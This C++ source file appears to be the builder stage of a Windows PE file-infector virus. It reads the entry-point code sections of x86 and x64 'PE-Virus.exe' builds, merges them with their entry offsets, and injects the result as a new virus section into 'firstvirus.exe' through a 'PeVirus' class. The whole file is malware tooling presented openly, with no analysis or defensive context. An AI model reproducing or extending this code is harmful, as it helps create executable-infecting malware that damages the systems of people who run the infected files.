#include "viruscpp.h"

#include <filesystem>
#include <fstream>
#include <iostream>
#include <vector>

using namespace std;

int main(int argc, char *argv[]) {

    std::filesystem::path cwd = std::filesystem::current_path();
    string path = cwd.string();
    if (path.substr(path.size() - 5, path.size()) == "\\main")
    {
        path = path.substr(0, path.size() - 4);
    }
    else

    {
        return 0;
    }
    
	pe::PortableExecutable file_x86(path + "file\\virusexe\\x86\\PE-Virus.exe");
	pe::PortableExecutable file_x64(path + "file\\virusexe\\x64\\PE-Virus.exe");

	pe::SECTION code_section_x86 = file_x86.GetCodeSectionOfEntryPoint();
	pe::SECTION code_section_x64 = file_x64.GetCodeSectionOfEntryPoint();
	DWORD virus_entry_point_x86 = file_x86.GetEntryPoint() - code_section_x86.header.VirtualAddress + 8;
	DWORD virus_entry_point_x64 = file_x64.GetEntryPoint() - code_section_x64.header.VirtualAddress + 8;
	
    vector<unsigned char> merge(8);

	memcpy(&merge[0], &virus_entry_point_x86, sizeof(DWORD));
	memcpy(&merge[4], &virus_entry_point_x64, sizeof(DWORD));

    std::copy (&code_section_x86.data[0], &code_section_x86.data[code_section_x86.data.size()], std::back_inserter(merge));
    std::copy (&code_section_x64.data[0], &code_section_x64.data[code_section_x64.data.size()], std::back_inserter(merge));

	virus::PeVirus virus_file("firstvirus.exe");

	virus_file.AddVirusSection(merge);
	virus_file.FlushChange();
}
